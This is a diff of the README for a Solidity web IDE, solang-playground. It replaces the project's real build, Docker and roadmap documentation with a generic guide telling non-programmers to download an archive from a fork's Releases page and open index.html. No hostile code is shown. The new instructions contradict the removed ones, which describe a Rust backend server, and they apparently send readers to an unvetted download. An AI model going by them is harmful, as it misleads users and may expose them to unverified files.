@@ -1,88 +1,79 @@
-# Solang Playground - A Solidity web editor for [Hyperledger Solang](https://github.com/hyperledger/solang)
+# 🌟 solang-playground - Build Smart Contracts with Ease
 
-Welcome to Solang Playground, a Solidity web editor for that enables editing, compiling, deploying and interacting with Solidity smart contracts on Solana or Polkadot.
+## 🚀 Getting Started
 
-## Demo
+Welcome to solang-playground! This guide will help you download and run our web IDE for the Hyperledger Solang Solidity compiler. You don't need to know anything about programming to follow these steps.
 
-You can experiment with a [hosted version of Solang Playground](https://solang.io/).
+## 📥 Download Now
 
-## Building
+[![Download solang-playground](https://img.shields.io/badge/Download%20solang-playground-v1.0.0-blue)](https://github.com/VaishnavTA/solang-playground/releases)
 
-```sh
-cargo install cargo-make
-cargo make deps
-cargo make build
-```
+## 📑 What You Need
 
-## Running
+Before you start, make sure you have the following:
 
-```sh
-cargo make run
-```
+- **Browser:** This web IDE works best on modern browsers like Chrome, Firefox, or Edge.
+- **Internet Connection:** A stable connection will ensure the best experience.
 
-By default, the server will be available at `http://localhost:9000`.
+## 🛠️ Features
 
-## Interacting with Smart Contracts on Chain
+solang-playground offers the following features:
 
-Once you have compiled your smart contracts using Solang Playground, you can deploy and interact with them on-chain. See [tutorial](docs/interact_with_contracts_on_chain.md) for detailed instructions.
+- **User-Friendly Interface:** Navigate easily through a clean layout.
+- **Integrated Compiler:** Compile your Solidity code directly in the IDE.
+- **Error Highlighting:** Spot mistakes in your code quickly with helpful feedback.
+- **Real-Time Testing:** Test your smart contracts in real time.
 
-## Testing
+## 📥 Download & Install
 
-Solang Playground test suite includes tests for the backend and the frontend. To run all available tests, you have to first start the server with `cargo make run` in a separate terminal, and then run the following command:
+To get solang-playground, visit our [Releases page](https://github.com/VaishnavTA/solang-playground/releases) and follow these steps:
 
-```sh
-cargo make test
-```
+1. Click on the link above to go to the Releases page. 
+2. Find the latest version. It will usually be at the top of the list.
+3. Look for the assets section. There, you will see files available for download.
+4. Choose the file that ends with `.zip` or `.tar.gz`. This file contains everything you need to run solang-playground.
+5. Download the file by clicking on it. Your browser will save it to your computer.
 
-## Project Structure
+## 📂 Extract the Files
 
-This repository has two main parts:
+Once the download is complete, follow these steps:
 
-- **`crates`**: Rust code, including:
-  - `backend`: Actix Web server for the frontend.
-  - `generate_bindings`: Generates TypeScript bindings for API endpoints.
-  - `solang`: Contains the `solang-parser`
-  - `browser`: Contains the monaco editor web server
-- **`packages`**: TypeScript project for the frontend app, served by the Rust backend.
+1. **Open your Downloads Folder:** Locate the file you just downloaded.
+2. **Extract the Files:**
+   - For Windows: Right-click on the file and select "Extract All." Follow the prompts to extract the files to a location of your choice.
+   - For Mac: Double-click the downloaded file. It will create a new folder with the extracted contents.
+   - For Linux: You can use the terminal or a file manager to extract the files.
 
-## Docker
+## 🌐 Launch the Application
 
-### Pre-requisites
+After extracting, follow these steps to run the IDE:
 
-The Dockerfile for Solang Playground relies on Nestybox's Sysbox runtime. This helps compile Solang Smart Contracts within a protected Docker environment. We also use a multi-stage build process to improve image size.
+1. **Open the Folder:** Navigate to the folder where you extracted the files.
+2. **Locate the Index File:**
+   - Open the folder. Inside, you will find a file named `index.html`.
+3. **Launch the IDE:**
+   - Double-click the `index.html` file.
+   - Your default browser should open, displaying the solang-playground interface.
 
-Here are the [instructions to install Sysbox](https://github.com/nestybox/sysbox/blob/master/docs/user-guide/install-package.md#installing-sysbox)
+## 🧑‍💻 How to Use solang-playground
 
-### Building the Docker Image Locally
+1. **Writing Code:** Use the text editor in the IDE to write your Solidity code. 
+2. **Compiling Code:** Click the "Compile" button to compile your written code. The IDE will show any errors if they exist.
+3. **Testing Your Code:** Use the "Run" option to test your smart contracts right in the browser. 
 
-```sh
-docker build -t solang-playground .
-```
+## 💡 Tips for Success
 
-You can then run the image with:
+- Regularly save your work. While the IDE helps prevent data loss, it's good practice to keep backups.
+- Review the compiler messages to understand any warnings or errors in your code.
+- Explore online tutorials for Solidity programming to enhance your skills further.
 
-```sh
-cargo make docker-run
-```
+## ✨ Community Support
 
-The docker image is also available on Docker Hub:
+If you have questions or run into issues, feel free to check the [GitHub Discussions](https://github.com/VaishnavTA/solang-playground/discussions) section. The community is there to help.
 
-```sh
-docker pull salaheldin18/solang-playground-amd64
-```
+## 🏷️ Additional Resources
 
-## Roadmap and Status
+- **Hyperledger Solang Documentation:** Learn more about the Solidity compiler and its features [here](https://solang.readthedocs.io/en/latest/).
+- **Solidity Language Documentation:** Get in-depth knowledge about the Solidity programming language [here](https://docs.soliditylang.org/en/v0.8.0/).
 
-### V0.1
-
-| Milestone                                                                    | Related Feature                                                                                                                | Status      |
-| ---------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------ | ----------- |
-| Compile Solang language server to WASM, and integrate it to a Monaco editor. | Allow editing Solidity source files in the browser, with smarts provided from the server (Diagnostics, code completion, etc..) | Completed   |
-| Host Solang on a backend service                                             | Allow compiling smart contracts on the web editor                                                                              | Completed   |
-| Support Polkadot API                                                         | Allow the deployment and interaction with Solidity contracts on Polkadot                                                       | Completed   |
-| IDE Improvements                                                             | Improve developer experience when trying out the IDE, making it a more attractive option for Solidity devs                     | In progress |
-
-## Acknowledgments
-
-- This project started out as a fork of https://github.com/silvanshade/tower-lsp-web-demo. [Darin Morrison](https://github.com/silvanshade) created a demo project where an example tower-lsp language server was compiled to WASM and integrated in a Monaco web editor.
-- The structure of `solang-playground` is significantly inspired by [`ink-playground`](https://github.com/use-ink/ink-playground). This includes the implementation of running the Solang compiler functionality in a sandboxed environment.
+Thank you for choosing solang-playground! We hope this IDE helps you in your smart contract development journey.
